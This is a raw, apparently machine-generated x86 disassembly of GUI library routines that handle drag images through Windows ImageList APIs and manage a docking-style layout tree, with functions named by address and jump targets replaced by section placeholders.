push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_456a80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456b40
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c4d4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42a88c
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c4d4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42a88c
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_456b4c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45baf4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_45bc30
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_456bac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45c560
mov eax ebx
call sub_45baf4
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_456bd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_45baf4
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_456a80
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_456c38
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_456b4c
push 0x0
call ShowCursor
sub_456c38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_45baf4
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_456c9c
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_456a28
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_456c9c
push ebx
mov ebx eax
mov eax ebx
call sub_45baf4
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_456cc0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45baf4
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_456a28
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_456d34
push ebx
push esi
mov esi eax
mov eax esi
call sub_45baf4
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_456c9c
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_456b94
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_456d7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_450de0
mov dl 0x1
mov eax [ r-xdata ]
call sub_42541c
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_44d490
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_456dd8
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450f04
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_456e28
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_425720
xor eax eax
push ebp
push sub_456ec6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_425b4c
xor eax eax
push ebp
push sub_456ea3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44d4a8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456eaa
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_425b4c
retn
sub_456ed8
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_456f6c
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_456ef4
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_456f6c
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_457564
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_456f6c
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_456fa0
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_457030
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov edx 0x2
call sub_457030
jmp r-xdata
retn
sub_456fe8
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_45709c
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov edx 0x2
call sub_45709c
jmp r-xdata
retn
sub_457030
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_457464
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_45709c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_456f50
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_457464
push eax
mov eax esi
call sub_456fa0
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_457464
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_45714c
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_456f50
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_457564
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_45709c
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_456f50
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_45709c
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_456fa0
mov edx eax
add edx esi
mov eax ebx
call sub_45748c
mov edx edi
mov eax ebx
call sub_45748c
jmp r-xdata
mov eax ebx
call sub_4572ec
mov eax ebx
call sub_45753c
mov ebx eax
test ebx ebx
jne r-xdata
sub_4571f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404118
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_40416c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
sub_457238
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403518
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_4572a9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_44f5cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_4572bc
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_45753c
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_4572ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_45709c
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45709c
mov esi eax
push ebp
call sub_4572bc
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45753c
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_457030
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_457030
mov ecx ebx
pop edx
call sub_417694
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44e274
mov eax [ ebp - 0x4 ]
call sub_457464
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_457464
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_457464
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_457464
push ebx
mov ebx eax
mov eax ebx
call sub_456f6c
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_456ef4
test al al
je r-xdata
mov eax ebx
call sub_456fa0
pop ebx
retn
sub_4574a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45748c
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_456f3c
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_457490
mov edx esi
call sub_4574a0
sub_4574dc
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_457464
mov edi eax
mov eax ebx
call sub_456fa0
cmp edi eax
jl r-xdata
mov eax esi
call sub_45714c
mov eax [ esi + 0x1c ]
push eax
push sub_458fec
mov edx esi
call sub_457818
mov eax ebx
call sub_457464
mov edi eax
mov eax esi
call sub_456fe8
cmp edi eax
jle r-xdata
mov eax ebx
call sub_4574dc
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_457548
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_456f6c
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_457570
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4032ec
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403668
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_456f18
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_425124
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42a2b0
mov edx eax
mov eax ebx
call sub_4252a0
mov eax [ ebp - 0x4 ]
call sub_457740
xor eax eax
push ebp
push sub_45767c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_451de4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_45714c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457683
mov eax [ ebp - 0x4 ]
call sub_457744
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_451da8
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_457683
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_459514
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4576d8
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_458744
mov eax [ esi + 0x10 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_457758
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_457758
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_457758
pop ecx
sub_4577b0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_457758
pop ecx
sub_4577dc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4577dc
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4577dc
pop ecx
sub_457830
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_4577b0
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_45709c
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_45709c
push eax
mov edx 0x1
mov eax ebx
call sub_457030
push eax
mov edx 0x2
mov eax ebx
call sub_457030
pop edx
pop ecx
call sub_417694
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402d00
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4578b4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_4572ec
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_417694
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44e274
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_456f18
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4577b0
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_456f3c
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_4587dc
mov edx esi
mov eax ebx
call sub_4577b0
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_44e858
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_456f18
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_44e844
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_45709c
mov edx eax
mov eax edi
call sub_45748c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_45709c
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_45709c
mov edx eax
mov eax edi
call sub_45748c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_45709c
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_457ac4
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_457c6c
jmp r-xdata
sub_457ac4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_456f18
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_457464
mov edx eax
mov eax ebx
call sub_45748c
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
